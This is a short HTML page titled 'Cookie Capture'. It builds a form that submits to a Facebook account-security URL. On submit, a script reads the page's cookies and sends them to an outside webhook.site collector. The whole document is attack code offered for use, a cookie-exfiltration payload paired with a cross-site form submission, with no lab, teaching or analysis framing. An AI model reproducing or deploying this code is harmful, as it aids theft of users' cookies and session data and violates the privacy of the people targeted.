<!DOCTYPE html>
<html>
<head>
    <title>Cookie Capture</title>
</head>
<body>
    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1" onsubmit="captureCookies()">
        <input type="hidden" name="hide_back_button" value="1">
        <input type="hidden" name="from_accounts_center" value="1">
        <input type="submit" value="Send">
    </form>

    <script>
        function captureCookies() {
            // Capture cookies
            var cookies = document.cookie;
            
            // Send cookies to webhook
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://webhook.site/513fcb7b-f6e1-408b-8d6d-3da8626bdfb2", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ cookies: cookies }));

            return true; // Proceed with form submission
        }
    </script>
</body>
</html>
